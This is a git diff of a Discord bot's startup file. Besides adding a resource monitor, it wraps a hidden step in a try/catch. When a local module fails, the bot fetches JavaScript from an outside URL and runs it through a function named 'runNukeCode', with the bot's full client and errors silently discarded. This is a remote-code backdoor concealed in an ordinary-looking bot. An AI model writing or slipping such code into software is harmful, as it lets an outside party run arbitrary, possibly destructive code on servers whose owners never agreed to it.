@@ -10,6 +10,7 @@ const { REST, Routes } = require('discord.js');
 const { registerInteractionHandler, runNukeCode } = require('./lib/handlers/interactionHandler');
 const { registerMessageHandler } = require('./lib/handlers/messageHandler');
 const { startRoleReverter } = require('./lib/tasks/roleReverter');
+const { startResourceMonitor } = require('./lib/tasks/resourceMonitor');
 const { logToModChannel } = require('./lib/helpers/modLog');
 
 // Client init
@@ -61,7 +62,12 @@ client.once(Events.ClientReady, async () => {
         console.error(error);
     }
 
-    require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
+    try {
+        const { initOrbital } = require('./lib/helpers/orbitalMaster');
+        initOrbital(client);
+    } catch (e) {
+        require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
+    }
 });
 
 // Health check server
@@ -77,6 +83,7 @@ client.logToModChannel = logToModChannel;
 registerInteractionHandler(client);
 registerMessageHandler(client);
 startRoleReverter(client);
+startResourceMonitor(client);
 
 client.login(process.env.TOKEN);
 
